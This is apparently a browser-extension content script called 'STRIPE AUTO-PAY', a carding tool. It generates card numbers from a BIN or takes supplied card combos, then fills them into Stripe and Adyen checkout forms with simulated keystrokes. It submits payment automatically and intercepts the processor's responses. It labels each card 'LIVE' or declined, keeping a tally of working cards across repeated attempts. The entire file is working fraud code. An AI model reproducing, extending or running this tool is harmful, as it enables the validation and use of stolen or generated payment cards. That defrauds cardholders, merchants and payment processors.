"use strict";

(function () {
  const cfgKey = "stripePayload";
  const frameId = "f" + Math.random().toString(36).slice(2, 9);
  const isTop = window.self === window.top;
  let running = false;
  let stopRequested = false;
  let tries = 0;
  let liveHits = 0;
  let currentTick = "";
  let pendingCard = null;
  let capturedResps = [];

  function getConfig() {
    return new Promise((resolve) => {
      chrome.storage.local.get([cfgKey], (res) => resolve(res[cfgKey] || null));
    });
  }

  function setConfig(cfg) {
    return new Promise((resolve) => {
      chrome.storage.local.set({ [cfgKey]: cfg }, resolve);
    });
  }

  function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

  function walkAll(root) {
    const out = [];
    const seen = new Set();
    (function walk(node) {
      if (!node) return;
      if (seen.has(node)) return;
      seen.add(node);
      let kids = [];
      if (node.nodeType === 1 || node.shadowRoot) {
        if (node.shadowRoot) kids = kids.concat(Array.from(node.shadowRoot.children));
        kids = kids.concat(Array.from(node.children));
      }
      for (const k of kids) walk(k);
      if (node.nodeType === 1) out.push(node);
    })(root);
    return out;
  }

  function injectHook() {
    try { chrome.runtime.sendMessage({ action: "FF_HOOK" }, () => {}); } catch (e) {}
  }
  function attachCapture() {
    try { chrome.runtime.sendMessage({ action: "DBG_ATTACH" }, () => {}); } catch (e) {}
  }
  function detachCapture() {
    try { chrome.runtime.sendMessage({ action: "DBG_DETACH" }, () => {}); } catch (e) {}
  }

  document.addEventListener("stripe-capture", (e) => {
    const d = e.detail || {};
    if (!d || !d.body) return;
    capturedResps.push({ at: Date.now(), url: d.url || "", status: d.status, body: String(d.body) });
    if (capturedResps.length > 60) capturedResps.shift();
  });

  function parseStripeResp(body) {
    try {
      const j = JSON.parse(body);
      if (!j || typeof j !== "object") return null;
      const err = j.error || null;
      const pi = j.payment_intent || j.intent || null;
      const out = {};
      out.message = (err && err.message) || "";
      out.decline = (err && err.decline_code) || "";
      out.code = (err && err.code) || "";
      out.status = (pi && pi.status) || j.status || "";
      out.action = (pi && pi.next_action && pi.next_action.type) || "";
      if (!out.message && !out.decline && !out.status && !out.action && !out.redirect_to_url) return null;
      out.redirect = j.redirect_to_url || "";
      return out;
    } catch (e) { return null; }
  }

  function lastRespSince(ts) {
    for (let i = capturedResps.length - 1; i >= 0; i--) {
      if (capturedResps[i].at >= ts) return capturedResps[i];
    }
    return null;
  }

  function fillOwned(card) {
    const fields = { number: false, month: false, year: false, cvc: false };
    let any = false;
    function classify(el) {
      const s = ((el.id || "") + " " + (el.name || "") + " " +
        (el.getAttribute("aria-label") || "") + " " + (el.getAttribute("placeholder") || "") + " " +
        (el.getAttribute("autocomplete") || "") + " " +
        (el.getAttribute("data-elements-stable-field-name") || "") + " " +
        (typeof el.className === "string" ? el.className : "")).toLowerCase();
      if (/(card\s*[-_ ]*number|ccnum|cardnumber|encryptedCardNumber|\bpan\b|enter your card number)/.test(s)) return "number";
      if (/(expiry|expiration)[-_ ]*(month)?|cardExpiry|encryptedExpiryMonth|expmonth/.test(s) && !/year/.test(s)) return "month";
      if (/(expiry|expiration)[-_ ]*year|cardExpiryYear|encryptedExpiryYear|expyear/.test(s) || (/exp/.test(s) && /year/.test(s))) return "year";
      if (/(cvc|cvv|csc|security)[-_ ]*(code)?|cardCvc|cardCvcFront|encryptedCvc/.test(s)) return "cvc";
      return null;
    }
    function typeValue(el, value) {
      const proto = el instanceof HTMLTextAreaElement ? HTMLTextAreaElement.prototype
        : el instanceof HTMLSelectElement ? HTMLSelectElement.prototype : HTMLInputElement.prototype;
      const desc = Object.getOwnPropertyDescriptor(proto, "value");
      if (!desc) return;
      desc.set.call(el, "");
      try { el.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "deleteContentBackward" })); } catch (e) {}
      const str = String(value);
      for (let i = 0; i < str.length; i++) {
        const ch = str[i];
        desc.set.call(el, el.value + ch);
        try {
          el.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, cancelable: true, key: ch }));
          el.dispatchEvent(new KeyboardEvent("keypress", { bubbles: true, cancelable: true, key: ch }));
          el.dispatchEvent(new InputEvent("beforeinput", { bubbles: true, cancelable: true, inputType: "insertText", data: ch }));
          el.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "insertText", data: ch }));
          el.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, cancelable: true, key: ch }));
        } catch (e) { el.dispatchEvent(new Event("input", { bubbles: true })); }
      }
      try { el.dispatchEvent(new InputEvent("input", { bubbles: true })); } catch (e) {}
      el.dispatchEvent(new Event("change", { bubbles: true }));
      el.dispatchEvent(new Event("blur", { bubbles: true }));
      el.dispatchEvent(new FocusEvent("focusout", { bubbles: true }));
    }
    function setNativeValue(el, value) {
      const proto = el instanceof HTMLTextAreaElement ? HTMLTextAreaElement.prototype
        : el instanceof HTMLSelectElement ? HTMLSelectElement.prototype : HTMLInputElement.prototype;
      const desc = Object.getOwnPropertyDescriptor(proto, "value");
      if (!desc) return;
      desc.set.call(el, value);
      el.dispatchEvent(new Event("input", { bubbles: true }));
      el.dispatchEvent(new Event("change", { bubbles: true }));
    }

    for (const inp of walkAll(document)) {
      if (inp.tagName !== "INPUT" && inp.tagName !== "SELECT") continue;
      if (inp.type === "hidden") continue;
      const kind = classify(inp);
      if (!kind) continue;
      if (kind === "number" && !fields.number) { typeValue(inp, card.number || ""); fields.number = true; any = true; }
      else if (kind === "month" && !fields.month) { typeValue(inp, String(card.month || card.expiryMonth || "12").padStart(2, "0")); fields.month = true; any = true; }
      else if (kind === "year" && !fields.year) { typeValue(inp, String(card.year || card.expiryYear || "2029").slice(-2)); fields.year = true; any = true; }
      else if (kind === "cvc" && !fields.cvc) { typeValue(inp, card.cvc || ""); fields.cvc = true; any = true; }
    }

    if (!fields.number) {
      const n = walkAll(document).filter((el) => el.matches && el.matches('input[autocomplete="cc-number"], input[name*="cardNumber"], input[id*="cardNumber"]'))[0];
      if (n) { typeValue(n, card.number || ""); fields.number = true; any = true; }
    }
    if (!fields.month && !fields.year) {
      const e = walkAll(document).filter((el) => el.matches && el.matches('input[autocomplete="cc-exp"], input[name*="expiry"], input[id*="expiry"]'))[0];
      if (e) {
        typeValue(e, String(card.month || card.expiryMonth || "12").padStart(2, "0") + "/" + String(card.year || card.expiryYear || "2029").slice(-2));
        fields.month = true; fields.year = true; any = true;
      }
    }
    if (!fields.cvc) {
      const c = walkAll(document).filter((el) => el.matches && el.matches('input[autocomplete="cc-csc"], input[name*="securityCode"], input[name*="cvc"]'))[0];
      if (c) { typeValue(c, card.cvc || ""); fields.cvc = true; any = true; }
    }

    const holder = walkAll(document).filter((el) => el.matches && el.matches('input[name*="holder"], input[id*="holder"], input[autocomplete="cc-name"]'))[0];
    if (holder) setNativeValue(holder, card.holder || "JOHN DOE");
    const email = walkAll(document).filter((el) => el.matches && el.matches('input[type="email"], input[name*="email"], input[id*="email"]'))[0];
    const maybeEmail = card.holder && /@/.test(card.holder) ? card.holder : (card.email || "");
    if (email && maybeEmail) setNativeValue(email, maybeEmail);

    return { fields, any };
  }

  const observer = new MutationObserver(() => {
    if (!pendingCard) return;
    const r = fillOwned(pendingCard);
    report("stp_ff", { tick: currentTick, fields: r.fields, any: r.any });
  });
  observer.observe(document.documentElement || document, { childList: true, subtree: true });

  function report(pref, obj) { chrome.storage.local.set({ [pref + "_" + frameId]: obj }); }
  function clearReports(pref) {
    chrome.storage.local.get(null, (all) => {
      const toDel = Object.keys(all).filter((k) => k.indexOf(pref) === 0);
      if (toDel.length) chrome.storage.local.remove(toDel);
    });
  }
  function summarize(pref) {
    return new Promise((resolve) => {
      chrome.storage.local.get(null, (all) => {
        const agg = { number: false, month: false, year: false, cvc: false, any: false, frames: 0, texts: [] };
        Object.keys(all).forEach((k) => {
          if (k.indexOf(pref) !== 0) return;
          const r = all[k];
          if (!r || r.tick === undefined || r.tick !== currentTick) return;
          agg.frames++;
          if (r.fields) {
            ["number", "month", "year", "cvc"].forEach((f) => { if (r.fields[f]) agg[f] = true; });
            if (r.any) agg.any = true;
          }
          if (r.text) agg.texts.push(r.text);
        });
        resolve(agg);
      });
    });
  }
  async function waitReports(pref, minWait, maxWait) {
    const start = Date.now();
    let lastCount = -1;
    let lastChange = Date.now();
    await sleep(600);
    while (Date.now() - start < (maxWait || 7000)) {
      const s = await summarize(pref);
      if (s.frames > 0 && s.frames !== lastCount) { lastCount = s.frames; lastChange = Date.now(); }
      if (s.frames > 0 && Date.now() - lastChange > 500) return s;
      if (Date.now() - start >= (minWait || 1500) && s.frames > 0) return s;
      await sleep(250);
    }
    return summarize(pref);
  }

  function execFill(card) {
    return new Promise((resolve) => {
      try {
        chrome.runtime.sendMessage({ action: "FF_EXEC", card: card }, (res) => {
          if (chrome.runtime.lastError || !res) {
            resolve({ any: false, fields: {}, error: chrome.runtime.lastError && chrome.runtime.lastError.message });
            return;
          }
          resolve(res);
        });
      } catch (e) { resolve({ any: false, fields: {}, error: String(e) }); }
    });
  }

  function execPay() {
    return new Promise((resolve) => {
      try {
        chrome.runtime.sendMessage({ action: "FF_PAY" }, (res) => {
          if (chrome.runtime.lastError || !res) { resolve({ clicked: [], detected: false, submitting: false }); return; }
          resolve(res);
        });
      } catch (e) { resolve({ clicked: [], detected: false, submitting: false }); }
    });
  }

  chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== "local") return;

    const ff = changes["stp_ff"];
    if (ff && ff.newValue && ff.newValue.card) {
      currentTick = ff.newValue.tick;
      pendingCard = ff.newValue.card;
      const r = fillOwned(pendingCard);
      report("stp_ff", { tick: ff.newValue.tick, fields: r.fields, any: r.any });
      return;
    }
    const dt = changes["stp_detect"];
    if (dt && dt.newValue) {
      currentTick = dt.newValue.tick;
      const text = document.body ? document.body.innerText.slice(0, 4000) : "";
      report("stp_dt", { tick: dt.newValue.tick, text: text });
      return;
    }
    const dbg = changes["stp_dbg"];
    if (dbg && dbg.newValue) {
      currentTick = dbg.newValue.tick;
      const inputs = walkAll(document).filter((i) => i.tagName === "INPUT").map((i) => ({
        t: i.type, n: i.name || "", id: i.id || "", al: i.getAttribute("aria-label") || "",
        ac: i.getAttribute("autocomplete") || "", ft: i.getAttribute("data-elements-stable-field-name") || "",
        pl: (i.getAttribute("placeholder") || "").slice(0, 30), vis: !!(i.offsetWidth || i.offsetHeight)
      }));
      const txt = JSON.stringify({ url: location.href.slice(0, 140), inputs: inputs, total: inputs.length }).slice(0, 3000);
      report("stp_dbg", { tick: dbg.newValue.tick, text: txt });
    }
    const rsp = changes["stripe_resp"];
    if (rsp && rsp.newValue && isTop) {
      const r = rsp.newValue;
      if (r.body && r.body.length > 4) {
        capturedResps.push({ at: Date.now(), url: r.url || "", status: 200, body: String(r.body) });
        if (capturedResps.length > 60) capturedResps.shift();
        const info = parseStripeResp(r.body);
        if (info && (info.message || info.decline || info.action || info.status)) {
          window.__nonoResult && window.__nonoResult("&#128225;",
            "RESP " + (info.decline || info.code ? info.decline + "/" + info.code + " " : "") +
            (info.message || info.status || info.action || "?"), "#c9b8ff");
        }
      }
    }
  });

  function ensureCardMethod() {
    const els = walkAll(document);
    const cardItems = els.filter((m) =>
      m.id && /payment-method-accordion-item/.test(m.id)
    );
    const target = cardItems.find((m) => /card/.test(m.id)) || cardItems.find((m) => /debit/.test(m.id));
    if (target) {
      fireClick(target);
      const label = els.find((m) => m.matches && m.matches("label[for='" + target.id + "']"));
      if (label) fireClick(label);
      const title = els.find((m) => m.matches && m.matches(
        "button, [role='button'], div[role]") && (
        (m.innerText || "").trim().toLowerCase() === "card" ||
        (m.innerText || "").trim().toLowerCase().indexOf("card") === 0));
      if (title) fireClick(title);
      return true;
    }
    for (const m of els) {
      const t = ((m.innerText || m.getAttribute("aria-label") || "") + "").toLowerCase();
      if (!/card|debit/.test(t)) continue;
      if (m.matches && m.matches("button, [role='button'], label, div, h3, h4")) {
        if (m.matches("input[type='radio']") || m.offsetParent) fireClick(m);
        return true;
      }
    }
    return false;
  }

  function findPayButton() {
    const buttons = walkAll(document).filter((b) =>
      b.matches && b.matches("button, [role='button'], input[type='submit'], input[type='button'], a")
    );
    for (const b of buttons) {
      const rect = b.getBoundingClientRect();
      if (!rect.width && !rect.height) continue;
      const text = ((b.innerText || b.value || b.getAttribute("aria-label") || "") + " " +
        (b.getAttribute("data-testid") || "")).trim().toLowerCase();
      if (/^(pay|pay now|pay \$?\d|proceed to pay|confirm|submit|place order|continue)/i.test(text)) return b;
    }
    for (const b of buttons) {
      const cls = (typeof b.className === "string" ? b.className : "");
      const rect = b.getBoundingClientRect();
      if (!rect.width && !rect.height) continue;
      if (/pay-button|submit|adyen-checkout__button/.test(cls) && !b.disabled) return b;
    }
    return null;
  }

  function fireClick(b) {
    if (!b) return;
    try { b.scrollIntoView({ block: "center" }); } catch (e) {}
    try { b.focus({ preventScroll: true }); } catch (e) {}
    const opts = { bubbles: true, cancelable: true, view: window, button: 0 };
    ["pointerdown", "mousedown", "pointerup", "mouseup", "click"].forEach((t) => {
      try {
        const Ctor = t.indexOf("pointer") === 0 ? PointerEvent : MouseEvent;
        b.dispatchEvent(new Ctor(t, opts));
      } catch (e) {
        try { b.dispatchEvent(new MouseEvent(t, { bubbles: true, cancelable: true })); } catch (e2) {}
      }
    });
    try { b.click(); } catch (e) {}
  }

  function isProcessing() {
    const html = document.documentElement ? document.documentElement.innerHTML : "";
    const t = document.body ? document.body.innerText : "";
    return /processing|spinner|loading|please wait|connecting|render-|-processing/.test(html.toLowerCase() + t.toLowerCase().slice(0, 600));
  }

  function findOpenCardForm() {
    const els = walkAll(document).filter((b) =>
      b.matches && b.matches("button, [role='button'], input[type='submit'], input[type='button'], a[href]")
    );
    for (const b of els) {
      const rect = b.getBoundingClientRect();
      if (!rect.width && !rect.height) continue;
      const t = ((b.innerText || b.value || b.getAttribute("aria-label") || "") + " " +
        (b.getAttribute("data-testid") || "") + " " + (b.id || "") + " " +
        (typeof b.className === "string" ? b.className : "")).toLowerCase();
      if (/(pay|submit|continue|confirm|get link|use card|enter card|card details|add card)/.test(t)) {
        return b;
      }
    }
    return null;
  }

  async function tryPayHard() {
    const res = await execPay();
    if (res.submitting) return true;
    await sleep(900);
    let ok = await submitClickLocal(5);
    if (ok) return true;
    const btn = findPayButton();
    if (btn) {
      if (btn.disabled) btn.disabled = false;
      fireClick(btn);
      await sleep(1500);
      if (isProcessing()) return true;
    }
    const forms = Array.from(document.querySelectorAll("form"));
    for (const f of forms) {
      try { f.dispatchEvent(new SubmitEvent("submit", { bubbles: true, cancelable: true })); } catch (e) {}
    }
    await sleep(1200);
    return res.detected || isProcessing();
  }

  async function submitClickLocal(retries) {
    retries = retries == null ? 5 : retries;
    for (let i = 0; i < retries; i++) {
      const btn = findPayButton();
      if (btn) fireClick(btn);
      await sleep(1200);
      if (isProcessing()) return true;
    }
    return false;
  }

  function topDocText() { return document.body ? (document.body.innerText || "").toLowerCase() : ""; }

  function detectResult(texts) {
    const all = (topDocText() + " " + texts.join(" ")).toLowerCase();
    const good = [
      "payment was successful", "payment successful", "payment complete", "thank you for your purchase",
      "payment received", "redirecting", "almost done", "successfully paid", "payment succeeded",
      "your purchase has been completed"
    ];
    for (const g of good) if (all.includes(g)) return { ok: true, label: "PROCESSED" };
    const bad = [
      "insufficient funds", "card was declined", "declined", "do not honor", "expired card",
      "expired", "card number is incorrect", "incorrect number", "invalid card number",
      "security code is incorrect", "incorrect cvc", "card not supported", "not supported",
      "cannot be used", "rejected", "failed", "invalid", "pick up card", "try again later"
    ];
    for (const b of bad) if (all.includes(b)) return { ok: false, label: b.toUpperCase() };
    return null;
  }

  function randomEmail() {
    const d = "gmail.com";
    return "us" + Math.floor(1000 + Math.random() * 9000) + new Date().getTime().toString().slice(-3) + "@" + d;
  }

  function buildPanel() {
    if (document.getElementById("stp-panel")) return;

    const panel = document.createElement("div");
    panel.id = "stp-panel";
    panel.style.cssText = [
      "position:fixed", "top:10px", "right:10px", "z-index:2147483647",
      "width:min(320px, calc(100vw - 20px))", "background:#0b0e13",
      "color:#e6e6e6", "font-family:Segoe UI, Roboto, sans-serif",
      "border:1px solid #1f2a33", "border-radius:14px", "padding:0",
      "box-shadow:0 12px 40px rgba(0,0,0,.65)", "font-size:12px",
      "user-select:none", "overflow:hidden",
      "max-height:calc(100vh - 20px)", "display:flex", "flex-direction:column"
    ].join(";");

    panel.innerHTML = `
      <div style="background:linear-gradient(135deg,#635bff,#4f46e5);color:#fff;padding:10px 12px;display:flex;justify-content:space-between;align-items:center">
        <div style="display:flex;align-items:center;gap:8px">
          <span style="font-size:16px">&#9889;</span>
          <b style="font-size:13px;letter-spacing:.5px">STRIPE AUTO-PAY</b>
          <span id="stp-ver" style="font-size:9px;background:#ffffff33;color:#fff;padding:2px 6px;border-radius:8px">1.0.3</span>
        </div>
        <div style="display:flex;gap:6px">
          <button id="stp-dbg" title="Debug DOM" style="background:#ffffff22;border:none;color:#fff;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
          <button id="stp-min" title="Minimize" style="background:#ffffff22;border:none;color:#fff;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:12px;line-height:1">&#8211;</button>
        </div>
      </div>

      <div style="padding:12px;display:flex;flex-direction:column;gap:6px">
        <div style="display:flex;gap:6px">
          <div style="flex:1">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Custom BIN</label>
            <input id="stp-bin" type="text" placeholder="4242424242424" maxlength="19" inputmode="numeric"
              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
          </div>
          <div style="width:88px">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Card Len</label>
            <select id="stp-len" style="width:100%;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
              <option value="16">16</option><option value="15">15</option><option value="19">19</option>
            </select>
          </div>
        </div>

        <div style="display:flex;gap:6px;align-items:flex-end">
          <div style="flex:1">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Or Full Combo</label>
            <input id="stp-combo" type="text" placeholder="number|mm|yyyy|cvc" inputmode="numeric"
              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
          </div>
          <div style="width:88px">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Email</label>
            <input id="stp-email" type="text" placeholder="(empty = random)"
              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
          </div>
        </div>

        <div style="display:flex;gap:6px;align-items:center;font-size:11px;margin-top:2px">
          <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
            <input type="checkbox" id="stp-autosubmit" style="width:auto;accent-color:#635bff"> Auto Submit
          </label>
          <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
            <input type="checkbox" id="stp-autoonload" style="width:auto;accent-color:#635bff"> Auto on Load
          </label>
        </div>

        <div style="display:flex;gap:6px;margin-top:4px">
          <button id="stp-start" style="flex:2;padding:11px;background:linear-gradient(135deg,#635bff,#4f46e5);color:#fff;border:none;border-radius:9px;font-weight:700;font-size:13px;cursor:pointer">&#9654; START HIT</button>
          <button id="stp-stop" style="flex:1;padding:11px;background:#23303c;color:#e6e6e6;border:none;border-radius:9px;font-weight:600;font-size:12px;cursor:pointer">STOP</button>
        </div>

        <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:2px">
          <span style="color:#635bff" id="stp-log">Ready, Chief.</span>
          <span style="color:#ffcc00" id="stp-count">Live: 0</span>
        </div>

        <div id="stp-results" style="max-height:150px;overflow-y:auto;font-size:11px;border-top:1px solid #1a2430;padding-top:6px"></div>

        <div style="display:flex;justify-content:flex-end">
          <button id="stp-close" style="background:none;border:none;color:#5a6b7c;cursor:pointer;font-size:11px;padding:2px 6px;border-radius:6px">Remove</button>
        </div>
      </div>
    `;

    document.body.appendChild(panel);

    const pill = document.createElement("div");
    pill.id = "stp-pill";
    pill.style.cssText = [
      "position:fixed", "right:10px", "top:30%", "z-index:2147483647",
      "width:48px", "height:48px", "border-radius:14px",
      "background:linear-gradient(135deg,#635bff,#4f46e5)", "color:#fff",
      "display:none", "align-items:center", "justify-content:center",
      "font-size:20px", "cursor:pointer", "box-shadow:0 6px 20px rgba(0,0,0,.5)",
      "touch-action:none", "user-select:none", "flex-direction:column", "gap:0"
    ].join(";");
    pill.innerHTML = '<span style="line-height:1">&#9889;</span><span id="stp-pill-count" style="font-size:8px;font-weight:700;line-height:1">0</span>';
    document.body.appendChild(pill);

    const box = panel.querySelector("#stp-results");
    const log = panel.querySelector("#stp-log");
    const count = panel.querySelector("#stp-count");
    const pillCount = document.getElementById("stp-pill-count");

    function minimize() {
      panel.style.display = "none";
      pill.style.display = "flex";
    }
    function restore() {
      pill.style.display = "none";
      panel.style.display = "flex";
    }
    pill.addEventListener("click", restore);

    const el = (id) => panel.querySelector(id);

    function savePanelState() {
      const cfg = {
        bin: el("#stp-bin").value.trim(),
        combo: el("#stp-combo").value.trim(),
        email: el("#stp-email").value.trim(),
        cardLength: parseInt(el("#stp-len").value, 10) || 16,
        autoSubmit: el("#stp-autosubmit").checked,
        autoOnLoad: el("#stp-autoonload").checked,
        enabled: true
      };
      setConfig(cfg);
      return cfg;
    }

    function logMsg(m) { log.textContent = m; }
    function updateCount() {
      count.textContent = "Live: " + liveHits + " / " + tries;
      pillCount.textContent = String(liveHits);
    }
    function logResult(icon, text, color) {
      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px solid #141c26;color:" + color + ";white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:flex;gap:4px;align-items:center";
      line.innerHTML = '<span style="flex-shrink:0">' + icon + '</span><span style="overflow:hidden;text-overflow:ellipsis">' + text + '</span>';
      box.prepend(line);
      while (box.children.length > 12) box.lastChild.remove();
    }

    async function debugDump() {
      logMsg("Gathering frame inventory...");
      const tick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = tick;
      clearReports("stp_dbg");
      chrome.storage.local.set({ stp_dbg: { tick: tick } });
      await sleep(1400);
      const s = await summarize("stp_dbg");
      const iframes = Array.from(document.querySelectorAll("iframe")).map((f) => ({
        src: (f.src || "").slice(0, 130), title: f.title || "", w: f.offsetWidth, h: f.offsetHeight
      }));
      let out = "URL:" + location.href + " | iframes:" + iframes.length + " " + JSON.stringify(iframes) +
        " | inputs:" + walkAll(document).filter((i) => i.tagName === "INPUT").length;
      s.texts.forEach((t, i) => { out += "\n---FRAME " + (i + 1) + "---" + t; });
      if (!s.texts.length) out += "\n(no frame handlers answered)";
      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px dashed #1a2430;color:#9be;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:250px;overflow:auto";
      line.textContent = out;
      box.prepend(line);
      logMsg("Debug dump ready.");
    }

    el("#stp-min").addEventListener("click", minimize);
    el("#stp-dbg").addEventListener("click", debugDump);
    el("#stp-close").addEventListener("click", () => panel.remove());
    el("#stp-bin").addEventListener("input", savePanelState);
    el("#stp-combo").addEventListener("input", savePanelState);
    el("#stp-email").addEventListener("input", savePanelState);
    el("#stp-len").addEventListener("change", savePanelState);
    el("#stp-autosubmit").addEventListener("change", savePanelState);
    el("#stp-autoonload").addEventListener("change", savePanelState);

    el("#stp-start").addEventListener("click", startHit);
    el("#stp-stop").addEventListener("click", () => {
      stopRequested = true;
      detachCapture();
      logMsg("Stopped by Chief.");
    });

    function startHit() {
      const bin = el("#stp-bin").value.trim();
      const combo = el("#stp-combo").value.trim();
      if (!bin && !combo) { logMsg("Give me a BIN or combo first, Chief."); return; }
      savePanelState();
      injectHook();
      attachCapture();
      stopRequested = false;
      tries = 0;
      liveHits = 0;
      updateCount();
      box.innerHTML = "";
      logMsg("Hitting...");
      runHits();
    }

    window.__nonoLog = logMsg;
    window.__nonoUpdate = updateCount;
    window.__nonoResult = logResult;
  }

  function parseCombo(combo) {
    const parts = combo.split("|").map((s) => s.trim());
    return { number: (parts[0] || "").replace(/\s/g, ""), month: parts[1] || "", year: parts[2] || "", cvc: parts[3] || "" };
  }

  async function fillRound(card) {
    let got = { any: false, fields: {} };
    try {
      const res = await execFill(card);
      if (res && !res.error && res.any) got = { any: true, fields: res.fields || {} };
    } catch (e) {}
    const tick = Date.now() + Math.floor(Math.random() * 1000);
    currentTick = tick;
    clearReports("stp_ff");
    chrome.storage.local.set({ stp_ff: { card: card, tick: tick } });
    const st = await waitReports("stp_ff", 1300, 5500);
    return { exec: got, storage: st, any: got.any || st.any };
  }

  async function runHits() {
    const cfg = await getConfig();
    if (!cfg) return;
    running = true;
    window.__nonoLog && window.__nonoLog("Running...");

    while (!stopRequested && running) {
      const hitStart = Date.now();
      let card;
      if (cfg.combo) {
        const p = parseCombo(cfg.combo);
        card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, email: cfg.email || randomEmail() };
      } else {
        card = window.CardGen.genCard(cfg.bin.replace(/\s/g, ""), { length: cfg.cardLength || 16 });
        card.month = card.expiryMonth;
        card.year = card.expiryYear;
        card.email = cfg.email || randomEmail();
      }
      pendingCard = card;

      tries++;
      window.__nonoUpdate && window.__nonoUpdate();
      window.__nonoLog && window.__nonoLog("Try #" + tries + " -> " + card.number);

      let st = { any: false };
      for (let round = 0; round < 4 && !stopRequested; round++) {
        ensureCardMethod();
        await sleep(450);
        st = await fillRound(card);
        if (st.any) break;
        const snippet = (document.body ? (document.body.innerText + "").slice(0, 320) : "");
        const frames = Array.from(document.querySelectorAll("iframe")).map((f) => (f.src || f.title || "?").slice(0, 90));
        const btns = walkAll(document).filter((b) => b.matches && b.matches("button, [role='button'], input[type='submit']"))
          .filter((b) => { const r = b.getBoundingClientRect(); return r.width && r.height; })
          .map((b) => (b.innerText || b.value || b.getAttribute("aria-label") || "btn").trim().slice(0, 24));
        window.__nonoLog && window.__nonoLog("Round " + (round + 1) + "/4. Page: " +
          snippet.replace(/\s+/g, " ").trim().slice(0, 200) + " || ifr:" + frames.length + " " +
          frames.slice(0, 4).join(",") + " || btns: " + btns.slice(0, 8).join(" | "));
        if (round === 0) {
          const opener = findOpenCardForm();
          if (opener) {
            window.__nonoLog && window.__nonoLog("Opening card form popup...");
            fireClick(opener);
          }
        }
        await sleep(2500);
      }

      let submitted = false;
      if (cfg.autoSubmit && st.any) {
        submitted = await tryPayHard();
        if (!submitted) {
          window.__nonoLog && window.__nonoLog("Pay dead, re-fill + retry...");
          st = await fillRound(card);
          await sleep(800);
          submitted = await tryPayHard();
        }
        await sleep(1800);
      }

      const resp = lastRespSince(hitStart);
      let respInfo = resp ? parseStripeResp(resp.body) : null;

      const dtTick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = dtTick;
      clearReports("stp_detect");
      chrome.storage.local.set({ stp_detect: { tick: dtTick } });
      const dt = await waitReports("stp_detect", 700, 4000);

      let res = detectResult(dt.texts);
      if (respInfo) {
        const status = (respInfo.status || "").toLowerCase();
        const action = (respInfo.action || "").toLowerCase();
        const isGood = /succeeded|processing|requires_action|redirect/.test(status + action) ||
          /\bredirect\b/.test(respInfo.redirect);
        res = {
          ok: isGood,
          label: (respInfo.decline ? respInfo.decline + " | " : "") +
            (respInfo.message || respInfo.status || respInfo.action || "RESP")
        };
      }
      if (!res) {
        if (!st.any) res = { ok: false, label: "FIELDS NOT FOUND" };
        else if (!submitted) res = { ok: false, label: "PAY MISSED" };
        else res = { ok: false, label: "NO VISIBLE RESULT" };
      }

      window.__nonoUpdate && window.__nonoUpdate();

      const respTail = respInfo
        ? " | " + (respInfo.decline ? respInfo.decline + " " : "") +
          (respInfo.message || respInfo.status || respInfo.action || "")
        : "";

      if (res.ok) {
        liveHits++;
        window.__nonoUpdate && window.__nonoUpdate();
        window.__nonoResult && window.__nonoResult("&#11088;",
          "LIVE #" + liveHits + "  " + card.number + " " + card.month + "/" + card.year.slice(-2) +
          " " + card.cvc + " -> " + res.label, "#00d1b2");
        window.__nonoLog && window.__nonoLog("LIVE HIT! " + res.label + ". Stopping.");
        stopRequested = true;
      } else {
        window.__nonoResult && window.__nonoResult("&#10060;",
          "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
          " " + card.cvc + " -> " + res.label + respTail, "#ff5d5d");
        if (tries >= 30) {
          window.__nonoLog && window.__nonoLog("30 dead tries. Stopping.");
          stopRequested = true;
        }
      }

      await sleep(cfg.autoSubmit ? 2000 : 800);
    }

    running = false;
    window.__nonoLog && window.__nonoLog("Cycle stopped.");
  }

  async function init() {
    if (!isTop) return;
    buildPanel();
    const cfg = await getConfig();
    if (cfg) {
      const ids = ["stp-bin", "stp-combo", "stp-email", "stp-len", "stp-autosubmit", "stp-autoonload"];
      const vals = [cfg.bin || "", cfg.combo || "", cfg.email || "", String(cfg.cardLength || 16), !!cfg.autoSubmit, !!cfg.autoOnLoad];
      ids.forEach((id, i) => {
        const e = document.getElementById(id);
        if (e) {
          if (e.type === "checkbox") e.checked = vals[i];
          else e.value = vals[i];
        }
      });
      if (cfg.enabled && cfg.autoOnLoad) {
        setTimeout(() => {
          const b = document.getElementById("stp-start");
          if (b) b.click();
        }, 1800);
      }
    }
  }

  setTimeout(init, 700);
})();